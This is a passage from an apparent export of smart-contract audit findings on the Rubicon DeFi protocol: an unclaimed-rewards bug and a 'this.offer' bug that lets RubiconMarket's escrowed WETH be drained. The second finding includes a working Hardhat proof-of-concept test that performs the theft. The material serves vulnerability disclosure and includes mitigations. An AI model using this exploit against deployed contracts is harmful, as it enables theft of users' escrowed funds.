comptroller.mintAllowed(address(this), minter, mintAmount);\n        // ...\n    }\n\n    // Comptroller.sol\n    function mintAllowed(\n        address cToken,\n        address minter,\n        uint mintAmount\n    ) external override returns (uint) {\n        // Pausing is a very serious situation - we revert to sound the alarms\n        require(!mintGuardianPaused[cToken], \"mint is paused\");\n\n        // Shh - currently unused\n        minter;\n        mintAmount;\n\n        if (!markets[cToken].isListed) {\n            return uint(Error.MARKET_NOT_LISTED);\n        }\n\n        // Keep the flywheel moving\n        updateCompSupplyIndex(cToken);\n        distributeSupplierComp(cToken, minter);\n\n        return uint(Error.NO_ERROR);\n    }\n```\n\nThe Position contract supplies and borrows tokens from the market when opening up a new position or updating an existing one:\n```sol\n    /// @notice borrow `_amount` of underlying token of `_cToken`\n    function _borrow(address _cToken, uint256 _amount) internal {\n        require(\n            CErc20Interface(_cToken).borrow(_amount) == 0,\n            \"_borrow: BORROW FAILED\"\n        );\n    }\n\n    function _supply(\n        address _token,\n        address _bathToken,\n        uint256 _amount\n    ) internal returns (uint256 _bathTokenAmount) {\n        uint256 _initBathTokenAmount = IERC20(_bathToken).balanceOf(\n            address(this)\n        );\n        IERC20(_token).safeApprove(_bathToken, _amount);\n        require(\n            CErc20Interface(_bathToken).mint(_amount) == 0,\n            \"_supply: MINT FAILED\"\n        );\n        uint256 _currentBathTokenAmount = IERC20(_bathToken).balanceOf(\n            address(this)\n        );\n\n        assembly {\n            switch _initBathTokenAmount\n            case 0 {\n                _bathTokenAmount := _currentBathTokenAmount\n            }\n            default {\n                _bathTokenAmount := sub(\n                    _currentBathTokenAmount,\n                    _initBathTokenAmount\n                )\n            }\n        }\n    }\n```\n\nIn BathHouseV2 we can see that the protocol expects to use the Comptroller rewards mechanism. It calls `claimComp()` to harvest those rewards for the caller:\n\n```sol\n    /// @notice claim available rewards\n    /// across all the pools\n    function claimRewards(\n        address[] memory buddies,\n        address[] memory rewardsTokens\n    ) external {\n        // claim rewards from comptroller\n        comptroller.claimComp(msg.sender);\n        // get rewards from bathBuddy\n        for (uint256 i = 0; i < buddies.length; ++i) {\n            IBathBuddy(buddies[i]).getReward(\n                IERC20(rewardsTokens[i]),\n                msg.sender\n            );\n        }\n    }\n```\n\nTo claim the rewards, the Position contract also has to call `claimComp()`. But, it never does. Thus, the rewards are accrued to the Position contract but never claimed.\n\n## Tools Used\nnone\n\n## Recommended Mitigation Steps\nThe Position contract has to distribute rewards to users.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L350-L379\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L271-L277\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L113-L128\n\n\n# Vulnerability details\n\n## Impact\nIn Compound V2 both borrowers and suppliers are eligible to earn rewards. The Position contract allows users to create long/short positions for each market. For that, it both supplies and borrows tokens from a compound market. So while the user is the one who provided the initial tokens to open up a position, it's the Position contract that holds the cTokens that earn the rewards. These rewards are not distributed to position owners. Instead, they are locked up as the Position contract never claims them. That also means that anybody else who uses the market has their rewards diluted.\n\n## Proof of Concept\nWhenever cTokens are minted, transferred, or burned the Comptroller is notified to distribute rewards. When cTokens are minted, `mintFresh()` triggers [`Comptroller.mintAllowed()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/CToken.sol#L400) which distributes rewards through [`distributeSupplierComp()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/Comptroller.sol#L322):\n```sol\n    // CToken.sol\n    function mintFresh(address minter, uint mintAmount) internal {\n        /* Fail if mint not allowed */\n        uint allowed = comptroller.mintAllowed(address(this), minter, mintAmount);\n        // ...\n    }\n\n    // Comptroller.sol\n    function mintAllowed(\n        address cToken,\n        address minter,\n        uint mintAmount\n    ) external override returns (uint) {\n        // Pausing is a very serious situation - we revert to sound the alarms\n        require(!mintGuardianPaused[cToken], \"mint is paused\");\n\n        // Shh - currently unused\n        minter;\n        mintAmount;\n\n        if (!markets[cToken].isListed) {\n            return uint(Error.MARKET_NOT_LISTED);\n        }\n\n        // Keep the flywheel moving\n        updateCompSupplyIndex(cToken);\n        distributeSupplierComp(cToken, minter);\n\n        return uint(Error.NO_ERROR);\n    }\n```\n\nThe Position contract supplies and borrows tokens from the market when opening up a new position or updating an existing one:\n```sol\n    /// @notice borrow `_amount` of underlying token of `_cToken`\n    function _borrow(address _cToken, uint256 _amount) internal {\n        require(\n            CErc20Interface(_cToken).borrow(_amount) == 0,\n            \"_borrow: BORROW FAILED\"\n        );\n    }\n\n    function _supply(\n        address _token,\n        address _bathToken,\n        uint256 _amount\n    ) internal returns (uint256 _bathTokenAmount) {\n        uint256 _initBathTokenAmount = IERC20(_bathToken).balanceOf(\n            address(this)\n        );\n        IERC20(_token).safeApprove(_bathToken, _amount);\n        require(\n            CErc20Interface(_bathToken).mint(_amount) == 0,\n            \"_supply: MINT FAILED\"\n        );\n        uint256 _currentBathTokenAmount = IERC20(_bathToken).balanceOf(\n            address(this)\n        );\n\n        assembly {\n            switch _initBathTokenAmount\n            case 0 {\n                _bathTokenAmount := _currentBathTokenAmount\n            }\n            default {\n                _bathTokenAmount := sub(\n                    _currentBathTokenAmount,\n                    _initBathTokenAmount\n                )\n            }\n        }\n    }\n```\n\nIn BathHouseV2 we can see that the protocol expects to use the Comptroller rewards mechanism. It calls `claimComp()` to harvest those rewards for the caller:\n\n```sol\n    /// @notice claim available rewards\n    /// across all the pools\n    function claimRewards(\n        address[] memory buddies,\n        address[] memory rewardsTokens\n    ) external {\n        // claim rewards from comptroller\n        comptroller.claimComp(msg.sender);\n        // get rewards from bathBuddy\n        for (uint256 i = 0; i < buddies.length; ++i) {\n            IBathBuddy(buddies[i]).getReward(\n                IERC20(rewardsTokens[i]),\n                msg.sender\n            );\n        }\n    }\n```\n\nTo claim the rewards, the Position contract also has to call `claimComp()`. But, it never does. Thus, the rewards are accrued to the Position contract but never claimed. \n\n## Tools Used\nnone\n\n## Recommended Mitigation Steps\nThe Position contract has to distribute rewards to users.",
      "description": null,
      "impact": "## Impact\nIn Compound V2 both borrowers and suppliers are eligible to earn rewards. The Position contract allows users to create long/short positions for each market. For that, it both supplies and borrows tokens from a compound market. So while the user is the one who provided the initial tokens to open up a position, it's the Position contract that holds the cTokens that earn the rewards. These rewards are not distributed to position owners. Instead, they are locked up as the Position contract never claims them. That also means that anybody else who uses the market has their rewards diluted.\n",
      "mitigation": "## Recommended Mitigation Steps\nThe Position contract has to distribute rewards to users.\n",
      "poc": "## Proof of Concept\nWhenever cTokens are minted, transferred, or burned the Comptroller is notified to distribute rewards. When cTokens are minted, `mintFresh()` triggers [`Comptroller.mintAllowed()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/CToken.sol#L400) which distributes rewards through [`distributeSupplierComp()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/Comptroller.sol#L322):\n```sol\n    // CToken.sol\n    function mintFresh(address minter, uint mintAmount) internal {\n        /* Fail if mint not allowed */\n        uint allowed = comptroller.mintAllowed(address(this), minter, mintAmount);\n        // ...\n    }\n\n    // Comptroller.sol\n    function mintAllowed(\n        address cToken,\n        address minter,\n        uint mintAmount\n    ) external override returns (uint) {\n        // Pausing is a very serious situation - we revert to sound the alarms\n        require(!mintGuardianPaused[cToken], \"mint is paused\");\n\n        // Shh - currently unused\n        minter;\n        mintAmount;\n\n        if (!markets[cToken].isListed) {\n            return uint(Error.MARKET_NOT_LISTED);\n        }\n\n        // Keep the flywheel moving\n        updateCompSupplyIndex(cToken);\n        distributeSupplierComp(cToken, minter);\n\n        return uint(Error.NO_ERROR);\n    }\n```\n\nThe Position contract supplies and borrows tokens from the market when opening up a new position or updating an existing one:\n```sol\n    /// @notice borrow `_amount` of underlying token of `_cToken`\n    function _borrow(address _cToken, uint256 _amount) internal {\n        require(\n            CErc20Interface(_cToken).borrow(_amount) == 0,\n            \"_borrow: BORROW FAILED\"\n        );\n    }\n\n    function _supply(\n        address _token,\n        address _bathToken,\n        uint256 _amount\n    ) internal returns (uint256 _bathTokenAmount) {\n        uint256 _initBathTokenAmount = IERC20(_bathToken).balanceOf(\n            address(this)\n        );\n        IERC20(_token).safeApprove(_bathToken, _amount);\n        require(\n            CErc20Interface(_bathToken).mint(_amount) == 0,\n            \"_supply: MINT FAILED\"\n        );\n        uint256 _currentBathTokenAmount = IERC20(_bathToken).balanceOf(\n            address(this)\n        );\n\n        assembly {\n            switch _initBathTokenAmount\n            case 0 {\n                _bathTokenAmount := _currentBathTokenAmount\n            }\n            default {\n                _bathTokenAmount := sub(\n                    _currentBathTokenAmount,\n                    _initBathTokenAmount\n                )\n            }\n        }\n    }\n```\n\nIn BathHouseV2 we can see that the protocol expects to use the Comptroller rewards mechanism. It calls `claimComp()` to harvest those rewards for the caller:\n\n```sol\n    /// @notice claim available rewards\n    /// across all the pools\n    function claimRewards(\n        address[] memory buddies,\n        address[] memory rewardsTokens\n    ) external {\n        // claim rewards from comptroller\n        comptroller.claimComp(msg.sender);\n        // get rewards from bathBuddy\n        for (uint256 i = 0; i < buddies.length; ++i) {\n            IBathBuddy(buddies[i]).getReward(\n                IERC20(rewardsTokens[i]),\n                msg.sender\n            );\n        }\n    }\n```\n\nTo claim the rewards, the Position contract also has to call `claimComp()`. But, it never does. Thus, the rewards are accrued to the Position contract but never claimed.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L350-L379\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L271-L277\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L113-L128\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nnone\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nIn Compound V2 both borrowers and suppliers are eligible to earn rewards. The Position contract allows users to create long/short positions for each market. For that, it both supplies and borrows tokens from a compound market. So while the user is the one who provided the initial tokens to open up a position, it's the Position contract that holds the cTokens that earn the rewards. These rewards are not distributed to position owners. Instead, they are locked up as the Position contract never claims them. That also means that anybody else who uses the market has their rewards diluted.\n",
        "recommendation": "## Recommended Mitigation Steps\nThe Position contract has to distribute rewards to users.\n",
        "poc": "## Proof of Concept\nWhenever cTokens are minted, transferred, or burned the Comptroller is notified to distribute rewards. When cTokens are minted, `mintFresh()` triggers [`Comptroller.mintAllowed()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/CToken.sol#L400) which distributes rewards through [`distributeSupplierComp()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/Comptroller.sol#L322):\n```sol\n    // CToken.sol\n    function mintFresh(address minter, uint mintAmount) internal {\n        /* Fail if mint not allowed */\n        uint allowed = comptroller.mintAllowed(address(this), minter, mintAmount);\n        // ...\n    }\n\n    // Comptroller.sol\n    function mintAllowed(\n        address cToken,\n        address minter,\n        uint mintAmount\n    ) external override returns (uint) {\n        // Pausing is a very serious situation - we revert to sound the alarms\n        require(!mintGuardianPaused[cToken], \"mint is paused\");\n\n        // Shh - currently unused\n        minter;\n        mintAmount;\n\n        if (!markets[cToken].isListed) {\n            return uint(Error.MARKET_NOT_LISTED);\n        }\n\n        // Keep the flywheel moving\n        updateCompSupplyIndex(cToken);\n        distributeSupplierComp(cToken, minter);\n\n        return uint(Error.NO_ERROR);\n    }\n```\n\nThe Position contract supplies and borrows tokens from the market when opening up a new position or updating an existing one:\n```sol\n    /// @notice borrow `_amount` of underlying token of `_cToken`\n    function _borrow(address _cToken, uint256 _amount) internal {\n        require(\n            CErc20Interface(_cToken).borrow(_amount) == 0,\n            \"_borrow: BORROW FAILED\"\n        );\n    }\n\n    function _supply(\n        address _token,\n        address _bathToken,\n        uint256 _amount\n    ) internal returns (uint256 _bathTokenAmount) {\n        uint256 _initBathTokenAmount = IERC20(_bathToken).balanceOf(\n            address(this)\n        );\n        IERC20(_token).safeApprove(_bathToken, _amount);\n        require(\n            CErc20Interface(_bathToken).mint(_amount) == 0,\n            \"_supply: MINT FAILED\"\n        );\n        uint256 _currentBathTokenAmount = IERC20(_bathToken).balanceOf(\n            address(this)\n        );\n\n        assembly {\n            switch _initBathTokenAmount\n            case 0 {\n                _bathTokenAmount := _currentBathTokenAmount\n            }\n            default {\n                _bathTokenAmount := sub(\n                    _currentBathTokenAmount,\n                    _initBathTokenAmount\n                )\n            }\n        }\n    }\n```\n\nIn BathHouseV2 we can see that the protocol expects to use the Comptroller rewards mechanism. It calls `claimComp()` to harvest those rewards for the caller:\n\n```sol\n    /// @notice claim available rewards\n    /// across all the pools\n    function claimRewards(\n        address[] memory buddies,\n        address[] memory rewardsTokens\n    ) external {\n        // claim rewards from comptroller\n        comptroller.claimComp(msg.sender);\n        // get rewards from bathBuddy\n        for (uint256 i = 0; i < buddies.length; ++i) {\n            IBathBuddy(buddies[i]).getReward(\n                IERC20(rewardsTokens[i]),\n                msg.sender\n            );\n        }\n    }\n```\n\nTo claim the rewards, the Position contract also has to call `claimComp()`. But, it never does. Thus, the rewards are accrued to the Position contract but never claimed.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L350-L379\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L271-L277\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L113-L128\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nnone\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L350-L379\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L271-L277\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L113-L128\n\n\n# Vulnerability details\n\n## Impact\nIn Compound V2 both borrowers and suppliers are eligible to earn rewards. The Position contract allows users to create long/short positions for each market. For that, it both supplies and borrows tokens from a compound market. So while the user is the one who provided the initial tokens to open up a position, it's the Position contract that holds the cTokens that earn the rewards. These rewards are not distributed to position owners. Instead, they are locked up as the Position contract never claims them. That also means that anybody else who uses the market has their rewards diluted.\n\n## Proof of Concept\nWhenever cTokens are minted, transferred, or burned the Comptroller is notified to distribute rewards. When cTokens are minted, `mintFresh()` triggers [`Comptroller.mintAllowed()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/CToken.sol#L400) which distributes rewards through [`distributeSupplierComp()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/Comptroller.sol#L322):\n```sol\n    // CToken.sol\n    function mintFresh(address minter, uint mintAmount) internal {\n        /* Fail if mint not allowed */\n        uint allowed = comptroller.mintAllowed(address(this), minter, mintAmount);\n        // ...\n    }\n\n    // Comptroller.sol\n    function mintAllowed(\n        address cToken,\n        address minter,\n        uint mintAmount\n    ) external override returns (uint) {\n        // Pausing is a very serious situation - we revert to sound the alarms\n        require(!mintGuardianPaused[cToken], \"mint is paused\");\n\n        // Shh - currently unused\n        minter;\n        mintAmount;\n\n        if (!markets[cToken].isListed) {\n            return uint(Error.MARKET_NOT_LISTED);\n        }\n\n        // Keep the flywheel moving\n        updateCompSupplyIndex(cToken);\n        distributeSupplierComp(cToken, minter);\n\n        return uint(Error.NO_ERROR);\n    }\n```\n\nThe Position contract supplies and borrows tokens from the market when opening up a new position or updating an existing one:\n```sol\n    /// @notice borrow `_amount` of underlying token of `_cToken`\n    function _borrow(address _cToken, uint256 _amount) internal {\n        require(\n            CErc20Interface(_cToken).borrow(_amount) == 0,\n            \"_borrow: BORROW FAILED\"\n        );\n    }\n\n    function _supply(\n        address _token,\n        address _bathToken,\n        uint256 _amount\n    ) internal returns (uint256 _bathTokenAmount) {\n        uint256 _initBathTokenAmount = IERC20(_bathToken).balanceOf(\n            address(this)\n        );\n        IERC20(_token).safeApprove(_bathToken, _amount);\n        require(\n            CErc20Interface(_bathToken).mint(_amount) == 0,\n            \"_supply: MINT FAILED\"\n        );\n        uint256 _currentBathTokenAmount = IERC20(_bathToken).balanceOf(\n            address(this)\n        );\n\n        assembly {\n            switch _initBathTokenAmount\n            case 0 {\n                _bathTokenAmount := _currentBathTokenAmount\n            }\n            default {\n                _bathTokenAmount := sub(\n                    _currentBathTokenAmount,\n                    _initBathTokenAmount\n                )\n            }\n        }\n    }\n```\n\nIn BathHouseV2 we can see that the protocol expects to use the Comptroller rewards mechanism. It calls `claimComp()` to harvest those rewards for the caller:\n\n```sol\n    /// @notice claim available rewards\n    /// across all the pools\n    function claimRewards(\n        address[] memory buddies,\n        address[] memory rewardsTokens\n    ) external {\n        // claim rewards from comptroller\n        comptroller.claimComp(msg.sender);\n        // get rewards from bathBuddy\n        for (uint256 i = 0; i < buddies.length; ++i) {\n            IBathBuddy(buddies[i]).getReward(\n                IERC20(rewardsTokens[i]),\n                msg.sender\n            );\n        }\n    }\n```\n\nTo claim the rewards, the Position contract also has to call `claimComp()`. But, it never does. Thus, the rewards are accrued to the Position contract but never claimed.\n\n## Tools Used\nnone\n\n## Recommended Mitigation Steps\nThe Position contract has to distribute rewards to users.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1052,
      "page_start": null,
      "heading": "1052. RubiconMarket batchOffer and batchRequote make offers as self; complete loss of funds for some types of tokens, for example WETH",
      "heading_cleaned": "RubiconMarket batchOffer and batchRequote make offers as self; complete loss of funds for some types of tokens, for example WETH",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L900\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L926\n\n\n# Vulnerability details\n\nThe `RubiconMarket` functions `batchOffer` and `batchRequote` both contain calls to `offer` as follows.\n```Solidity\nthis.offer(\n    payAmts[i],\n    ERC20(payGems[i]),\n    buyAmts[i],\n    ERC20(buyGems[i])\n);\n```\nBut calling `offer` using `this.offer` will [use a message call instead of a jump](https://docs.soliditylang.org/en/v0.8.19/control-structures.html#function-calls).\nThis means that in `offer`, the value of `msg.sender` will be the address of the `RubiconMarket` contract, not of the original sender. Hence the offer will be made by the `RubiconMarket` itself.\n\n\n## Impact\n\nAn attacker can use this to make `RubiconMarket` offer all its balance of a particular token (possibly in exchange for a token the attacker created, so at effectively zero cost), with the attacker then taking the offer and thereby stealing `RubiconMarket`'s entire balance in that token.\n\nFor this attack to work, the `RubiconMarket` must be able to actually make the offer itself, and the crucial condition here is that [line 538](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L538)\n```Solidity\nrequire(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n```\nin the `offer` function of `SimpleMarket` must not revert if this call is made by the `RubiconMarket` contract and `msg.sender` is *also* that same contract, even though `RubiconMarket` did not approve a transfer to itself.\nWhether this condition is satisfied depends on the token.\nFor example in the [standard ERC20 token contract by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol), this condition is not satisfied.\n\nHowever, in the [WETH contract](https://optimistic.etherscan.io/address/0x4200000000000000000000000000000000000006#code), the check in the `transferFrom` function is\n```Solidity\nif (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n    require(allowance[src][msg.sender] >= wad);\n    allowance[src][msg.sender] -= wad;\n}\n```\nso if the caller is also the `src`, then it is not necessary to approve the transfer beforehand. This means the vulnerability outlined above can be used to drain all WETH held by a `RubiconMarket`, and possibly the balance in other tokens where `transferFrom` is implemented similarly.\n\n\n## Proof of Concept\n\nAfter applying the diff below, run\n```\nnpx hardhat test --grep \"ShalaamumMarketThis\"\n```\nto run the POC. The output should contain the following.\n```\n  Rubicon v2 Protocol Tests\n    ShalaamumMarketThis\n      âœ“ Initialized Market\n      âœ“ attacker has 1 ETH and 0 WETH\n      âœ“ attacker deploys own attackerCoin\n      âœ“ rubiconMarket holds 10 WETH\n      âœ“ Attacker exploiting vulnerability and making market offer assets held in escrow\n      âœ“ Attacker taking offer\n      âœ“ rubiconMarket holds 0 WETH\n      âœ“ attacker holds 10 WETH\n```\n\nThe POC demonstrates how an attacker can deploy their own token and then use `batchOffer` to make the `RubiconMarket` offer its entire balance of WETH for some of the attacker's token. The attacker then takes that offer at no cost (except some gas) and thereby steals the `10 WETH` the `RubiconMarket` held in escrow for previous unfilled offers.\n\n\n### Files to change\n\nApply the following diff to `test/hardhat-tests/ProtocolDeployment.ts`:\n```diff\ndiff --git a/test/hardhat-tests/ProtocolDeployment.ts b/test/hardhat-tests/ProtocolDeployment.ts\nindex b55d879..0b8e6ba 100644\n--- a/test/hardhat-tests/ProtocolDeployment.ts\n+++ b/test/hardhat-tests/ProtocolDeployment.ts\n@@ -1,4 +1,4 @@\n-import { time, loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\n+import { time, loadFixture, setBalance } from \"@nomicfoundation/hardhat-network-helpers\";\n import { anyValue } from \"@nomicfoundation/hardhat-chai-matchers/withArgs\";\n import { expect } from \"chai\";\n import { ethers, network } from \"hardhat\";\n@@ -213,6 +213,77 @@ describe(\"Rubicon v2 Protocol Tests\", function () {\n     };\n   }\n\n+  describe(\"ShalaamumMarketThis\", function () {\n+    let rubiconMarket, weth, attacker;\n+    let attackerCoin;\n+    const attackerBalanceStart = 10n**18n;\n+    let marketWethStart;\n+\n+    before(async function () {\n+      let otherAccount;\n+      ({ rubiconMarket, weth, otherAccount } = await loadFixture(\n+        deployRubiconProtocolFixture\n+      ));\n+      attacker = otherAccount;\n+    });\n+\n+    it(\"Initialized Market\", async function () {\n+      expect(await rubiconMarket.initialized()).to.equal(true);\n+    });\n+\n+    it(\"attacker has 1 ETH and 0 WETH\", async function () {\n+      setBalance(attacker.address, attackerBalanceStart);\n+      expect(await ethers.provider.getBalance(attacker.address)).eq(attackerBalanceStart);\n+      expect(await weth.balanceOf(attacker.address)).eq(0);\n+    });\n+\n+    it(\"attacker deploys own attackerCoin\", async function () {\n+      const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\", attacker);\n+      attackerCoin = await testCoinFactory.deploy(\n+        attacker.address,\n+        \"AttackerCoin\",\n+        \"ATTACKCOIN\",\n+        18\n+      );\n+      await attackerCoin.connect(attacker).adminMint();\n+      expect(await attackerCoin.balanceOf(attacker.address)).to.be.gte(1);\n+    });\n+\n+    it(\"rubiconMarket holds 10 WETH\", async function () {\n+      marketWethStart = await weth.balanceOf(rubiconMarket.address);\n+      expect(marketWethStart).eq(10n*10n**18n);\n+    });\n+\n+    it(\"Attacker exploiting vulnerability and causing market to offer assets held in escrow\", async function () {\n+      await rubiconMarket.connect(attacker).batchOffer(\n+        [marketWethStart],\n+        [weth.address],\n+        [1],\n+        [attackerCoin.address]\n+      );\n+    });\n+\n+    it(\"Attacker taking offer\", async function () {\n+      let lastOfferId = await rubiconMarket.last_offer_id();\n+      await attackerCoin.connect(attacker).approve(\n+        rubiconMarket.address,\n+        1\n+      )\n+      await rubiconMarket.connect(attacker).buy(\n+        lastOfferId,\n+        marketWethStart.mul(10000).div(9999)\n+      );\n+    });\n+\n+    it(\"rubiconMarket holds 0 WETH\", async function () {\n+      expect(await weth.balanceOf(rubiconMarket.address)).eq(0);\n+    });\n+\n+    it(\"attacker holds 10 WETH\", async function () {\n+      expect(await weth.balanceOf(attacker.address)).eq(10n*10n**18n);\n+    });\n+  });\n+\n   describe(\"Protocol Tests\", async function () {\n     // *** Core ***\n     describe(\"Rubicon Market\", function () {\n```\n\n## Mitigation\n\nChange `this.offer` to `offer`. As the `offer` function is currently `external`, it will have to be changed to `public`.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L900\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L926\n\n\n# Vulnerability details\n\nThe `RubiconMarket` functions `batchOffer` and `batchRequote` both contain calls to `offer` as follows.\n```Solidity\nthis.offer(\n    payAmts[i],\n    ERC20(payGems[i]),\n    buyAmts[i],\n    ERC20(buyGems[i])\n);\n```\nBut calling `offer` using `this.offer` will [use a message call instead of a jump](https://docs.soliditylang.org/en/v0.8.19/control-structures.html#function-calls).\nThis means that in `offer`, the value of `msg.sender` will be the address of the `RubiconMarket` contract, not of the original sender. Hence the offer will be made by the `RubiconMarket` itself.\n\n\n## Impact\n\nAn attacker can use this to make `RubiconMarket` offer all its balance of a particular token (possibly in exchange for a token the attacker created, so at effectively zero cost), with the attacker then taking the offer and thereby stealing `RubiconMarket`'s entire balance in that token.\n\nFor this attack to work, the `RubiconMarket` must be able to actually make the offer itself, and the crucial condition here is that [line 538](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L538)\n```Solidity\nrequire(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n```\nin the `offer` function of `SimpleMarket` must not revert if this call is made by the `RubiconMarket` contract and `msg.sender` is *also* that same contract, even though `RubiconMarket` did not approve a transfer to itself.\nWhether this condition is satisfied depends on the token.\nFor example in the [standard ERC20 token contract by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol), this condition is not satisfied.\n\nHowever, in the [WETH contract](https://optimistic.etherscan.io/address/0x4200000000000000000000000000000000000006#code), the check in the `transferFrom` function is\n```Solidity\nif (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n    require(allowance[src][msg.sender] >= wad);\n    allowance[src][msg.sender] -= wad;\n}\n```\nso if the caller is also the `src`, then it is not necessary to approve the transfer beforehand. This means the vulnerability outlined above can be used to drain all WETH held by a `RubiconMarket`, and possibly the balance in other tokens where `transferFrom` is implemented similarly.\n\n\n## Proof of Concept\n\nAfter applying the diff below, run\n```\nnpx hardhat test --grep \"ShalaamumMarketThis\"\n```\nto run the POC. The output should contain the following.\n```\n  Rubicon v2 Protocol Tests\n    ShalaamumMarketThis\n      âœ“ Initialized Market\n      âœ“ attacker has 1 ETH and 0 WETH\n      âœ“ attacker deploys own attackerCoin\n      âœ“ rubiconMarket holds 10 WETH\n      âœ“ Attacker exploiting vulnerability and making market offer assets held in escrow\n      âœ“ Attacker taking offer\n      âœ“ rubiconMarket holds 0 WETH\n      âœ“ attacker holds 10 WETH\n```\n\nThe POC demonstrates how an attacker can deploy their own token and then use `batchOffer` to make the `RubiconMarket` offer its entire balance of WETH for some of the attacker's token. The attacker then takes that offer at no cost (except some gas) and thereby steals the `10 WETH` the `RubiconMarket` held in escrow for previous unfilled offers.\n\n\n### Files to change\n\nApply the following diff to `test/hardhat-tests/ProtocolDeployment.ts`:\n```diff\ndiff --git a/test/hardhat-tests/ProtocolDeployment.ts b/test/hardhat-tests/ProtocolDeployment.ts\nindex b55d879..0b8e6ba 100644\n--- a/test/hardhat-tests/ProtocolDeployment.ts\n+++ b/test/hardhat-tests/ProtocolDeployment.ts\n@@ -1,4 +1,4 @@\n-import { time, loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\n+import { time, loadFixture, setBalance } from \"@nomicfoundation/hardhat-network-helpers\";\n import { anyValue } from \"@nomicfoundation/hardhat-chai-matchers/withArgs\";\n import { expect } from \"chai\";\n import { ethers, network } from \"hardhat\";\n@@ -213,6 +213,77 @@ describe(\"Rubicon v2 Protocol Tests\", function () {\n     };\n   }\n \n+  describe(\"ShalaamumMarketThis\", function () {\n+    let rubiconMarket, weth, attacker;\n+    let attackerCoin;\n+    const attackerBalanceStart = 10n**18n;\n+    let marketWethStart;\n+  \n+    before(async function () {\n+      let otherAccount;\n+      ({ rubiconMarket, weth, otherAccount } = await loadFixture(\n+        deployRubiconProtocolFixture\n+      ));\n+      attacker = otherAccount;\n+    });\n+  \n+    it(\"Initialized Market\", async function () {\n+      expect(await rubiconMarket.initialized()).to.equal(true);\n+    });\n+\n+    it(\"attacker has 1 ETH and 0 WETH\", async function () {\n+      setBalance(attacker.address, attackerBalanceStart);\n+      expect(await ethers.provider.getBalance(attacker.address)).eq(attackerBalanceStart);\n+      expect(await weth.balanceOf(attacker.address)).eq(0);\n+    });\n+\n+    it(\"attacker deploys own attackerCoin\", async function () {\n+      const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\", attacker);\n+      attackerCoin = await testCoinFactory.deploy(\n+        attacker.address,\n+        \"AttackerCoin\",\n+        \"ATTACKCOIN\",\n+        18\n+      );\n+      await attackerCoin.connect(attacker).adminMint();\n+      expect(await attackerCoin.balanceOf(attacker.address)).to.be.gte(1);\n+    });\n+\n+    it(\"rubiconMarket holds 10 WETH\", async function () {\n+      marketWethStart = await weth.balanceOf(rubiconMarket.address);\n+      expect(marketWethStart).eq(10n*10n**18n);\n+    });\n+\n+    it(\"Attacker exploiting vulnerability and causing market to offer assets held in escrow\", async function () {\n+      await rubiconMarket.connect(attacker).batchOffer(\n+        [marketWethStart],\n+        [weth.address],\n+        [1],\n+        [attackerCoin.address]\n+      );\n+    });\n+\n+    